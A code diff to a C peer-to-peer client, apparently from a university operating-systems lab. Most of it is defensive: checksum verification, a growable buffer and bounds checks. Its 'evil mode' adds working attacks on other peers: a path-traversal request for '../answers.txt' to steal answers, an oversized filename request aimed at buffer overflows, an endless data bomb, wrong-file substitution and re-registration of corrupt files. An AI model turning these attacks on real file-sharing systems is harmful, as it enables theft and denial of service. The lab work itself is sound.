@@ -41,7 +41,6 @@ const char *myalias;
 #define TASKBUFSIZ	4096	// Size of task_t::buf
 #define FILENAMESIZ	256		// Size of task_t::filename
 #define MAXFILESIZ 10485760	// Max size of file, 10 MB
-#define MAXPEERNUM 10		// Maximum number of peers to be connected to
 
 typedef enum tasktype {		// Which type of connection is this?
 	TASK_TRACKER,		// => Tracker connection
@@ -63,7 +62,8 @@ typedef struct task {
 	int peer_fd;		// File descriptor to peer/tracker, or -1
 	int disk_fd;		// File descriptor to local file, or -1
 
-	char buf[TASKBUFSIZ];	// Bounded buffer abstraction
+	char *buf;	// Bounded buffer abstraction
+	size_t bufsiz;
 	unsigned head;
 	unsigned tail;
 	size_t total_written;	// Total number of bytes written
@@ -71,7 +71,7 @@ typedef struct task {
 
 	char filename[FILENAMESIZ];	// Requested filename
 	char disk_filename[FILENAMESIZ]; // Local filename (TASK_DOWNLOAD)
-	char md5_checksum[MD5_TEXT_DIGEST_MAX_SIZE]; // Tracker checksum
+	char md5_checksum[MD5_TEXT_DIGEST_MAX_SIZE + 1]; // Tracker checksum
 
 	peer_t *peer_list;	// List of peers that have 'filename'
 				// (TASK_DOWNLOAD).  The task_download
@@ -100,6 +100,10 @@ static task_t *task_new(tasktype_t type)
 
 	strcpy(t->filename, "");
 	strcpy(t->disk_filename, "");
+	
+	t->buf = (char *) malloc(sizeof(char) * TASKBUFSIZ);
+	t->bufsiz = TASKBUFSIZ;
+	memset(t->buf, 0, TASKBUFSIZ);
 
 	return t;
 }
@@ -138,6 +142,7 @@ static void task_free(task_t *t)
 		do {
 			task_pop_peer(t);
 		} while (t->peer_list);
+		free(t->buf);
 		free(t);
 	}
 }
@@ -165,12 +170,12 @@ typedef enum taskbufresult {		// Status of a read or write attempt.
 //	The task buffer is capped at TASKBUFSIZ.
 taskbufresult_t read_to_taskbuf(int fd, task_t *t)
 {
-	unsigned headpos = (t->head % TASKBUFSIZ);
-	unsigned tailpos = (t->tail % TASKBUFSIZ);
+	unsigned headpos = (t->head % t->bufsiz);
+	unsigned tailpos = (t->tail % t->bufsiz);
 	ssize_t amt;
 
 	if (t->head == t->tail || headpos < tailpos)
-		amt = read(fd, &t->buf[tailpos], TASKBUFSIZ - tailpos);
+		amt = read(fd, &t->buf[tailpos], t->bufsiz - tailpos);
 	else
 		amt = read(fd, &t->buf[tailpos], headpos - tailpos);
 
@@ -179,9 +184,9 @@ taskbufresult_t read_to_taskbuf(int fd, task_t *t)
 		return TBUF_AGAIN;
 	else if (amt == -1)
 		return TBUF_ERROR;
-	else if (amt == 0)
+	else if (amt == 0) {
 		return TBUF_END;
-	else {
+	} else {
 		t->tail += amt;
 		return TBUF_OK;
 	}
@@ -193,8 +198,8 @@ taskbufresult_t read_to_taskbuf(int fd, task_t *t)
 //	techniques and identical return values as read_to_taskbuf.
 taskbufresult_t write_from_taskbuf(int fd, task_t *t)
 {
-	unsigned headpos = (t->head % TASKBUFSIZ);
-	unsigned tailpos = (t->tail % TASKBUFSIZ);
+	unsigned headpos = (t->head % t->bufsiz);
+	unsigned tailpos = (t->tail % t->bufsiz);
 	ssize_t amt;
 
 	if (t->head == t->tail)
@@ -202,7 +207,7 @@ taskbufresult_t write_from_taskbuf(int fd, task_t *t)
 	else if (headpos < tailpos)
 		amt = write(fd, &t->buf[headpos], tailpos - headpos);
 	else
-		amt = write(fd, &t->buf[headpos], TASKBUFSIZ - headpos);
+		amt = write(fd, &t->buf[headpos], t->bufsiz - headpos);
 
 	if (amt == -1 && (errno == EINTR || errno == EAGAIN
 			  || errno == EWOULDBLOCK))
@@ -296,7 +301,7 @@ static size_t read_tracker_response(task_t *t)
 
 	while (1) {
 		// Check for whether buffer is complete.
-		for (; pos+3 < t->tail; pos++)
+		for (pos = 0; pos+3 < t->tail; pos++)
 			if ((pos == 0 || t->buf[pos-1] == '\n')
 			    && isdigit((unsigned char) t->buf[pos])
 			    && isdigit((unsigned char) t->buf[pos+1])
@@ -314,11 +319,20 @@ static size_t read_tracker_response(task_t *t)
 
 		// If not, read more data.  Note that the read will not block
 		// unless NO data is available.
-		int ret = read_to_taskbuf(t->peer_fd, t);
-		if (ret == TBUF_ERROR)
-			die("tracker read error");
-		else if (ret == TBUF_END)
-			die("tracker connection closed prematurely!\n");
+		int ret = TBUF_OK;
+		do {
+			if (t->tail == t->bufsiz) {
+				message("* Resizing task buf from %zu\n", t->bufsiz);
+				t->bufsiz *= 2;
+				t->buf = (char *) realloc(t->buf, t->bufsiz);
+			}
+			ret = read_to_taskbuf(t->peer_fd, t);
+			if (ret == TBUF_ERROR)
+				die("tracker read error");
+			else if (ret == TBUF_END && t->tail != t->bufsiz) {
+				die("tracker connection closed prematurely!\n");
+			}
+		} while (ret == TBUF_END && t->tail == t->bufsiz);
 	}
 }
 
@@ -386,6 +400,40 @@ task_t *start_listen(void)
 	return t;
 }
 
+//	Calculate MD5sum
+static char *md5_digest(const char *filename) {
+	md5_byte_t *data = NULL;
+	md5_state_t *state = (md5_state_t *) malloc(sizeof(md5_state_t));
+	char *text_digest = (char *) malloc(sizeof(char) * (MD5_TEXT_DIGEST_MAX_SIZE + 1));
+	
+	// Find file size
+	FILE *file;
+	file = fopen(filename, "r");
+	fseek(file, 0, SEEK_END);
+	int nbytes = ftell(file);
+		
+	// Read file into memory
+	// TODO: Chunk this instead of reading everything into memory at once
+	data = (md5_byte_t *) malloc(sizeof(md5_byte_t) * nbytes);
+	fseek(file, 0, SEEK_SET);
+	file = fopen(filename, "r");
+	size_t r = fread((void *) data, 1, nbytes, file);
+	if ((int) r != nbytes)
+		error("* fread %zu instead of %i bytes\n", r, nbytes);
+	fclose(file);
+
+	// append data
+	md5_init(state);
+	md5_append(state, data, nbytes);
+	int p = md5_finish_text(state, text_digest, 1);
+	text_digest[p] = 0;
+	
+	// cleanup
+	free(state);
+	free(data);
+	return text_digest;
+}
+
 
 // register_files(tracker_task, myalias)
 //	Registers this peer with the tracker, using 'myalias' as this peer's
@@ -427,11 +475,22 @@ static void register_files(task_t *tracker_task, const char *myalias)
 		    || (namelen > 1 && ent->d_name[namelen - 1] == '~'))
 			continue;
 
-		osp2p_writef(tracker_task->peer_fd, "HAVE %s\n", ent->d_name);
+		char *checksum = md5_digest(ent->d_name);
+		osp2p_writef(tracker_task->peer_fd, "HAVE %s %s\n", ent->d_name, checksum);
 		messagepos = read_tracker_response(tracker_task);
-		if (tracker_task->buf[messagepos] != '2')
+		if (tracker_task->buf[messagepos] != '2') {
 			error("* Tracker error message while registering '%s':\n%s",
 			      ent->d_name, &tracker_task->buf[messagepos]);
+		}
+		if (evil_mode) { // (re)register potentially corrupt files if checksum rejected
+			osp2p_writef(tracker_task->peer_fd, "HAVE %s\n", ent->d_name);
+			messagepos = read_tracker_response(tracker_task);
+			if (tracker_task->buf[messagepos] != '2') {
+				error("* Tracker error message while registering '%s':\n%s",
+					  ent->d_name, &tracker_task->buf[messagepos]);
+			}
+		}
+		free(checksum);
 	}
 
 	closedir(dir);
@@ -446,7 +505,9 @@ static peer_t *parse_peer(const char *s, size_t len)
 	peer_t *p = (peer_t *) malloc(sizeof(peer_t));
 	if (p) {
 		p->next = NULL;
-		if (osp2p_snscanf(s, len, "PEER %s %I:%d",
+		if (len > TASKBUFSIZ) {
+			error("* Ignoring peer: alias probably too long: %s\n", s);
+		} else if (osp2p_snscanf(s, len, "PEER %s %I:%d",
 				  p->alias, &p->addr, &p->port) >= 0
 		    && p->port > 0 && p->port <= 65535)
 			return p;
@@ -549,13 +610,16 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 	
 	osp2p_writef(tracker_task->peer_fd, "MD5SUM %s\n", filename);
 	messagepos = read_tracker_response(tracker_task);
-	message("* MD5SUM %s response: %s", filename, &tracker_task->buf[messagepos]);
 	if (tracker_task->buf[messagepos] == '2' && messagepos > 0) {
-		strncpy(tracker_task->md5_checksum, tracker_task->buf, messagepos - 1);
-		tracker_task->md5_checksum[messagepos - 1] = 0;
-		message("* Parsed MD5SUM: %s\n", tracker_task->md5_checksum);
+		if ((messagepos - 1) > MD5_TEXT_DIGEST_MAX_SIZE) {
+			error("* MD5SUM is too long: %s\n", tracker_task->buf);
+			goto exit;
+		}
+		strncpy(t->md5_checksum, tracker_task->buf, messagepos - 1);
+		t->md5_checksum[messagepos - 1] = 0;
+		message("* Parsed MD5SUM for '%s': %s\n", filename, t->md5_checksum);
 	} else
-		tracker_task->md5_checksum[0] = 0;
+		t->md5_checksum[0] = 0;
 	
 exit:
 	return t;
@@ -649,19 +713,36 @@ static void task_download(task_t *t, task_t *tracker_task)
 
 	// Empty files are usually a symptom of some error.
 	if (t->total_written > 0) {
-		message("* Downloaded '%s' was %lu bytes long\n",
-			t->disk_filename, (unsigned long) t->total_written);
+		// md5 verification
+		char *checksum = md5_digest(t->disk_filename);
+		
+		message("* Downloaded '%s' was %lu bytes long: %s\n",
+			t->disk_filename, (unsigned long) t->total_written, checksum);
+		
+		if (strlen(t->md5_checksum) > 0 && strcmp(t->disk_filename, t->filename) == 0) {
+			if (strcmp(t->md5_checksum, checksum) == 0) {
+				free(checksum);
+			} else {
+				error("* MD5 verification of '%s:%s' failed! Trying again\n", t->filename, t->md5_checksum);
+				free(checksum);
+				goto try_again;
+			}
+		} else {
+			strcpy(t->md5_checksum, checksum);
+			free(checksum);
+		}
+		
 		// Inform the tracker that we now have the file,
 		// and can serve it to others!  (But ignore tracker errors.)
 		if (strcmp(t->filename, t->disk_filename) == 0) {
-			osp2p_writef(tracker_task->peer_fd, "HAVE %s\n",
-				     t->filename);
+			osp2p_writef(tracker_task->peer_fd, "HAVE %s %s\n",
+				     t->filename, t->md5_checksum);
 			(void) read_tracker_response(tracker_task);
 		}
 		task_free(t);
 		return;
 	}
-	error("* Download [%s] was empty, trying next peer\n", t->filename);
+	error("* Download '%s' was empty, trying next peer\n", t->filename);
 
     try_again:
 	if (t->disk_filename[0])
@@ -735,7 +816,6 @@ static void task_upload(task_t *t)
 	assert(t->type == TASK_UPLOAD);
 	// First, read the request from the peer.
 	while (1) {
-		memset(t->buf, 0, TASKBUFSIZ);
 		int ret = read_to_taskbuf(t->peer_fd, t);
 		message("* Read task_upload request: %s\n", t->buf);
 		if (ret == TBUF_ERROR) {
@@ -765,13 +845,20 @@ static void task_upload(task_t *t)
 	
 	// Send infinite data bomb in evil mode (if a bad file was requested)
 	if (evil_mode && !exists) {
-		error("* Evilmode replacing missing file with bomb\n", t->filename);
+		error("* Evilmode replacing missing file with rickroll\n", t->filename);
 		strcpy(t->filename, "../rickroll.mp3");
 	} else if (!exists) {
 		error("* File %s does not exist in directory \n", t->filename);
 		goto exit;
 	} else if (evil_mode && exists) {
-		infinite = 1;
+		int r = rand()%2;
+		if (r == 0) {
+			infinite = 1;
+			message("* Turning on infinite data bomb\n");
+		} else if (r == 1) {
+			strcpy(t->filename, "../rickroll.mp3");
+			message("* Sending the wrong file\n");
+		}
 	}
 	
 	// Open file
@@ -822,9 +909,6 @@ static void upload_files (task_t *listen_task) {
 	FD_SET(listen_task->peer_fd, &masterset);
 	int max_fd = listen_task->peer_fd + 1;
 	
-	task_t *task_list[MAXPEERNUM];
-	memset(task_list, 0, MAXPEERNUM * sizeof(task_t *));
-	
 	int task_num = 0;
 	while (1) {
 		set = masterset;
@@ -856,7 +940,6 @@ static void upload_files (task_t *listen_task) {
 static void steal_file(task_t *tracker_task, const char *filename) {
 	task_t *t;
 	if ((t = who(tracker_task))) {
-		message("* Who returned\n");
 		int child = fork();
 		if (child == 0) {
 			strcpy(t->filename, filename);
@@ -880,7 +963,7 @@ static void overload_request(task_t *tracker_task) {
 				inet_ntoa(t->peer_list->addr), t->peer_list->port);
 		t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
 		if (t->peer_fd == -1) {
-			error("* Cannot connect to peer: %s\n", strerror(errno));
+			error("* Cannot connect to peer %s: %s\n", t->peer_list->alias, strerror(errno));
 		} else {
 			osp2p_writef(t->peer_fd, "GET pewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpewpew OSP2P\n", t->filename);
 		}
@@ -900,18 +983,6 @@ int main(int argc, char *argv[])
 	char *s;
 	struct passwd *pwent;
 	pid_t child;
-
-	// Default tracker is read.cs.ucla.edu
-	osp2p_sscanf("131.179.80.139:11111", "%I:%d",
-		     &tracker_addr, &tracker_port);
-	if ((pwent = getpwuid(getuid()))) {
-		myalias = (const char *) malloc(strlen(pwent->pw_name) + 20);
-		sprintf((char *) myalias, "%s%d", pwent->pw_name,
-			(int) time(NULL));
-	} else {
-		myalias = (const char *) malloc(40);
-		sprintf((char *) myalias, "osppeer%d", (int) getpid());
-	}
 
 	// Ignore broken-pipe signals: if a connection dies, server should not
 	signal(SIGPIPE, SIG_IGN);
@@ -962,6 +1033,26 @@ int main(int argc, char *argv[])
 "         -b[MODE]     Evil mode!!!!!!!!\n");
 		exit(0);
 	}
+	
+	// Default tracker is read.cs.ucla.edu
+	osp2p_sscanf("131.179.80.139:11111", "%I:%d",
+				 &tracker_addr, &tracker_port);
+	if ((pwent = getpwuid(getuid()))) {
+		if (evil_mode) {
+			myalias = (const char *) malloc(strlen(pwent->pw_name) + 25);
+			sprintf((char *) myalias, "%s%d%s", pwent->pw_name,
+					(int) time(NULL), "-evil");
+		} else {
+			myalias = (const char *) malloc(strlen(pwent->pw_name) + 20);
+			sprintf((char *) myalias, "%s%d", pwent->pw_name,
+					(int) time(NULL));
+		}
+	} else {
+		myalias = (const char *) malloc(40);
+		sprintf((char *) myalias, "osppeer%d", (int) getpid());
+	}
+	
+	message("* MyAlias: %s\n", myalias);
 
 	// Connect to the tracker and register our files.
 	tracker_task = start_tracker(tracker_addr, tracker_port);
@@ -984,6 +1075,7 @@ int main(int argc, char *argv[])
 	}
 	
 	if (evil_mode) {
+		srand(time(NULL));
 		message("* Evil mode\n");
 		// Thievery: steal other users' answers file
 		steal_file(tracker_task, "../answers.txt");
@@ -991,6 +1083,8 @@ int main(int argc, char *argv[])
 		
 		// Send an oversized filename request from all peers
 		overload_request(tracker_task);
+		
+		// TODO: spam bad md5sum values to tracker
 	}
 	
 	// Parent serves upload requests
